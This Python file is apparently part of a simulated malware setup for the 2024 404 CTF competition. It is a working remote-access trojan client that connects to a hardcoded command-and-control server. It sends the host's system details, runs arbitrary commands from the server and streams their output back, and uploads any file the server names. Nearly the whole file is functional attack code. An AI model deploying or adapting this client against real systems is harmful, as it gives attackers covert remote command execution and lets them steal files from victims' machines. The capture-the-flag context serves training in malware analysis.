import os
import shlex
import subprocess

from platform import uname
from threading import Thread
from typing import IO
from pathlib import Path

from protocol import *

COMMAND_AND_CONTROL = ("takemeouttotheballgame.space", 31299)

COMMENT = """
This file is part of a simulated malware infrastructure for the 2024 edition of the 404 CTF capture the flag competition (https://www.404ctf.fr)
"""


peer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
peer.connect(COMMAND_AND_CONTROL)
c2 = ProtocolSession(peer)

processes = {}


class ProcessTask:
    command: str
    task_id: int
    session: ProtocolSession
    process: subprocess.Popen

    def __init__(self, command, task_id, session):
        self.command = command
        self.task_id = task_id
        self.session = session

    def start(self):
        self.process = subprocess.Popen(
            shlex.split(self.command),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        processes[self.process.pid] = self
        self.session.send(ProcessStartedFrame(self.command, self.process.pid, self.task_id))
        Thread(target=self.forward_stream, args=(self.process.stderr, 2), daemon=True).start()
        Thread(target=self.forward_stream, args=(self.process.stdout, 1), daemon=True).start()
        Thread(target=self.wait_process, daemon=True).start()

    def forward_stream(self, stream: IO, descriptor: int):
        while True:
            data = os.read(stream.fileno(), 512)
            if len(data) == 0:
                break
            self.session.send(ProcessPipeFrame(self.process.pid, descriptor, data))

    def wait_process(self):
        code = self.process.wait()
        self.session.send(ProcessTerminatedFrame(self.process.pid, code))

    def kill(self):
        if self.process.poll() is None:
            self.process.kill()

    def write_stdin(self, data: bytes):
        self.process.stdin.write(data)
        self.process.stdin.flush()


@c2.handler(PingFrame)
def handle(frame: PingFrame, session: ProtocolSession):
    session.send(PongFrame(frame.when))


@c2.handler(SystemInfoRequestFrame)
def handle(frame: SystemInfoRequestFrame, session: ProtocolSession):
    send_system_info(session)


@c2.handler(DieRequestFrame)
def handle(frame: DieRequestFrame, session: ProtocolSession):
    for pid, process in processes.items():
        process.kill()
    exit()


@c2.handler(ProcessStartRequestFrame)
def handle(frame: ProcessStartRequestFrame, session: ProtocolSession):
    ProcessTask(frame.command, frame.request_id, session).start()


@c2.handler(ProcessPipeFrame)
def handle(frame: ProcessPipeFrame, session: ProtocolSession):
    if frame.descriptor != 0:
        return
    process: ProcessTask = processes.get(frame.pid)
    if process is None:
        return
    process.write_stdin(frame.data)


@c2.handler(FileDownloadRequestFrame)
def handler(frame: FileDownloadRequestFrame, session: ProtocolSession):
    def target():
        try:
            path = Path(frame.file)
            size = path.stat(follow_symlinks=True).st_size
            with open(frame.file, 'rb') as f:
                session.send(FileTransferStartFrame(frame.request_id, path.name, size))
                while True:
                    data = os.read(f.fileno(), frame.chunk_size)
                    if data == b'':
                        break
                    session.send(FileTransferDataFrame(frame.request_id, data))
                session.send(FileTransferCompleteFrame(frame.request_id))
        except Exception:
            session.send(FileTransferFailFrame(frame.request_id))
    Thread(target=target).start()


def send_system_info(session: ProtocolSession):
    info = uname()
    session.send(SystemInfoFrame(
        info.system,
        info.node,
        info.release,
        info.version,
        info.machine,
    ))


send_system_info(c2)
c2.run()
